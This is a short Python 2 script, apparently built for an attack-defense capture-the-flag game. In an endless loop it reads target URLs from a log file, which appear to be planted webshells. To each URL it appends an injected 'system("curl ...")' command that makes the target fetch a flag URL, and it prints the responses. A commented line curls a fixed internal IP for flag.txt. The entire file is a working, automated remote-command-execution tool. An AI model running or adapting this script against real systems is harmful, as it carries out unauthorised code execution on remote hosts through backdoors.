import requests
import time
import ConfigParser

cf = ConfigParser.ConfigParser()
cf.read("config.ini")
payload_t = cf.get('baseconf', "flag_url")
if __name__=="__main__":
    while(1):
        with open("one.log","r") as f:
            for line in f.xreadlines():
                line=line.strip("\n")
                try:
                    uu=line+'system("curl {0}");'.format(payload_t)
                    #print line+'system("curl http://192.168.0.112/flag.txt");'
                    ss=requests.get(uu,timeout=5)
                    if "404" not in ss.content:
                        print line + ss.content
                except Exception, e:
                    pass
                #print line
            f.close()
        time.sleep(180)